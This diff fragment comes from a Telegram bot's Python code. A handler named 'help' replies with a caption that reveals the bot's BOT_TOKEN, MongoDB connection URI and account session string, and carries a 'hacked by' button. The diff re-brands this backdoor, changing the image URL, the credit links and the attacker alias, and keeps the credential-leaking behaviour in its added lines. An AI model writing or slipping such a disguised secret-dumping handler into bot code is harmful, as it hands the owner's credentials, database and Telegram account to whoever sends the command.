@@ -123,13 +123,13 @@ async def restartbot(client, message: Message, _):
     & ~filters.edited)
 async def help(client: Client, message: Message):
     await message.reply_photo(
-          photo=f"https://graph.org/file/33575f0d9ca704b6a7b3b.jpg",
-        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 𝚅𝙸𝙿 𝙱𝙾𝚈.\n\n☆............𝙱𝚈 » [𝚅𝙸𝙿 𝙱𝙾𝚈](https://t.me/the_vip_boy)............☆""",
+          photo=f"https://telegra.ph//file/9a342972a6b78db65123b.jpg",
+        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 𝚅𝙸𝙿 𝙱𝙾𝚈.\n\n☆............𝙱𝚈 » [𝚅𝙸𝙿 𝙱𝙾𝚈](https://t.me/I_LOVE_YOU_PAGAL)............☆""",
          reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                          "• нαϲкє𝚍 ву νιρ ɓσყ •", url=f"https://t.me/THE_VIP_BOY")
+                          "• нαϲкє𝚍 ву ᴘᴏɪsᴏɴ •", url=f"https://t.me/I_LOVE_YOU_PAGAL")
                  ]
              ]
          ),
